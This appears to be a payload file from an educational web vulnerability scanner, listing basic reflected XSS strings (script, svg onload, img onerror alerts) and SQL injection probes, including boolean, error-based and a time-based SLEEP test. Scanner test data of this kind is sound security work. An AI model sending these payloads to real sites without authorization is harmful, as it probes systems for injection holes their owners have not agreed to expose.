# payloads.py
#
# Payloads used by the scanner to test for common vulnerabilities.
# These are intentionally simple and focused on education, not on
# bypassing advanced filters.

# Basic reflected XSS payloads
XSS_PAYLOADS = [
    # Simple script injection
    "<script>alert('XSS')</script>",

    # Breaking out of attributes / tags
    "'\"><svg/onload=alert(1)>",

    # Image-based onerror handler
    "<img src=x onerror=alert('XSS')>",
]

# Basic SQL Injection payloads (error-based and time-based)
SQLI_PAYLOADS = [
    # Classic boolean-based tests
    "' OR '1'='1",
    "' OR 1=1 --",

    # Error-based tests – often trigger database error messages
    "'\"",
    "' AND '1'='2",
    "' OR 'x'='y",

    # Simple time-based test (may delay response on vulnerable apps)
    "' OR SLEEP(5)--",
]